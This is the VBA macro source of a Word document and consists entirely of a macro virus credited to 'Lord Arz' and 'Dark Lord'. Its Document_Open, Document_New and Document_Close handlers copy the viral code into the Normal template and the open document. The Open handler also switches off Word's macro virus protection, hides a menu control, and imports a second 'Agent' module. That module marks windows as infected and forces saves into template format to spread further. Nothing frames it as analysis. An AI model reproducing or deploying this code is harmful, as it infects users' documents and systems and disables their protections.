   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Document_Close()
   Rem written by Lord Arz
   Rem BEGINN TDIE
   NormInstalled = False
   ActInstalled = False

   NormalTemplate.VBProject.VBComponents(1).Export ("c:\Normal.bas")
   ActiveDocument.VBProject.VBComponents(1).Export ("c:\Document.bas")

   NI = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
   AI = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1)

   If UCase(NI) = "REM WRITTEN BY LORD ARZ" Then NormInstalled = True
   If UCase(AI) = "REM WRITTEN BY LORD ARZ" Then ActInstalled = True

   If NormInstalled = True And ActIntalled = True Then GoTo PayLoad

   If NormInstalled = True Then IW = "c:\Normal.bas" Else IW = "C:\Document.bas"
   Open IW For Input As #1
   VirCode = "Private Sub Document_Close()" & Chr(13)
   Do
   Line Input #1, SRCLine
   Loop Until SRCLine = "Private Sub Document_Close()"
   Do Until UCase(SRCLine) = "REM END TDIE"
   Line Input #1, SRCLine
   VirCode = VirCode & SRCLine & Chr(13)
   Loop

   VirCode = VirCode & "End Sub"

   If NormInstalled = False Then
   Lines = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
   NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
   NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 1, VirCode
   End If
   If ActInstalled = False Then
   Lines = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
   ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
   ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, VirCode
   End If
   PayLoad:
   Close
   Kill "C:\Document.bas"
   Kill "C:\Normal.bas"
   End Sub

   Private Sub Document_New()
   Rem written by Lord Arz
   Rem BEGINN TDIE
   'TDIE   by Dark Lord and Lord Arz
   'Please don't remove this Sing
   NormInstalled = False
   ActInstalled = False

   NormalTemplate.VBProject.VBComponents(1).Export ("c:\Normal.bas")
   ActiveDocument.VBProject.VBComponents(1).Export ("c:\Document.bas")

   NI = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
   AI = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1)

   If UCase(NI) = "REM WRITTEN BY LORD ARZ" Then NormInstalled = True
   If UCase(AI) = "REM WRITTEN BY LORD ARZ" Then ActInstalled = True

   If NormInstalled = True And ActIntalled = True Then GoTo PayLoad

   If NormInstalled = True Then IW = "c:\Normal.bas" Else IW = "C:\Document.bas"
   Open IW For Input As #1
   VirCode = "Private Sub Document_Close()" & Chr(13)
   Do
   Line Input #1, SRCLine
   Loop Until SRCLine = "Private Sub Document_Close()"
   Do Until UCase(SRCLine) = "REM END TDIE"
   Line Input #1, SRCLine
   VirCode = VirCode & SRCLine & Chr(13)
   Loop

   VirCode = VirCode & "End Sub"

   If NormInstalled = False Then
   Lines = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
   NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
   NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 1, VirCode
   End If
   If ActInstalled = False Then
   Lines = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
   ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
   ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, VirCode
   End If
   PayLoad:
   Close
   Kill "C:\Document.bas"
   Kill "C:\Normal.bas"
   End Sub


   Private Sub Document_Open()
   Rem written by Lord Arz
   Rem BEGINN TDIE
   'TDIE   by Dark Lord and Lord Arz
   'Please don't remove this Sing
   Options.VirusProtection = False
   Application.CommandBars("Tools").Controls(12).Controls(3).Visible = False
   NormInstalled = False
   ActInstalled = False

   NormalTemplate.VBProject.VBComponents(1).Export ("c:\Normal.bas")
   ActiveDocument.VBProject.VBComponents(1).Export ("c:\Document.bas")

   NI = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
   AI = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1)

   If UCase(NI) = "REM WRITTEN BY LORD ARZ" Then NormInstalled = True
   If UCase(AI) = "REM WRITTEN BY LORD ARZ" Then ActInstalled = True

   If NormInstalled = True And ActIntalled = True Then GoTo PayLoad

   If NormInstalled = True Then IW = "c:\Normal.bas" Else IW = "C:\Document.bas"
   Open IW For Input As #1
   VirCode = "Private Sub Document_Close()" & Chr(13)
   Do
   Line Input #1, SRCLine
   Loop Until SRCLine = "Private Sub Document_Close()"
   Do Until UCase(SRCLine) = "REM END TDIE"
   Line Input #1, SRCLine
   VirCode = VirCode & SRCLine & Chr(13)
   Loop

   VirCode = VirCode & "End Sub"

   If NormInstalled = False Then
   Lines = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
   NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
   NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 1, VirCode
   End If
   If ActInstalled = False Then
   Lines = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
   ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
   ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, VirCode
   End If
   PayLoad:
   Close
   Kill "C:\Document.bas"
   Kill "C:\Normal.bas"
   On Error GoTo SetTrooper
   If NormalTemplate.VBProject.VBComponents("Agent").Name = "Agent" Then Exit Sub
   SetTrooper:
   Open "Trooper.bas" For Output As #1
   Print #1, "Attribute VB_Name = " & Chr(34) & "Agent" & Chr(34)
   Print #1, "Sub AutoOpen()"
   Print #1, "Options.VirusProdection=false"
   Print #1, "For x = 1 To Word.Windows.Count"
   Print #1, "Word.Windows.Item(x).Caption = " & Chr(34) & " Infected by the Carrier virus (a trooper has already landed)" & Chr(34)
   Print #1, "Next x"
   Print #1, "End Sub"
   Print #1, "Sub FileSaveAs()"
   Print #1, "Dialogs(wdDialogFileSaveAs).Show"
   Print #1, "If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then ActiveDocument.SaveAs FileFormat:=wdFormatTemplate"
   Print #1, "Application.OrganizerCopy Normaltemplate.FullName, ActiveDocument.FullName, Trooper, wdOrganizerObjectProjectItems"
   Print #1, "ActiveDocument.Save"
   Print #1, "End Sub"
   Close #1
   NormalTemplate.VBProject.VBComponents.Import ("Trooper.bas")
   Kill "Trooper.bas"
   Rem End TDIE
   End Sub
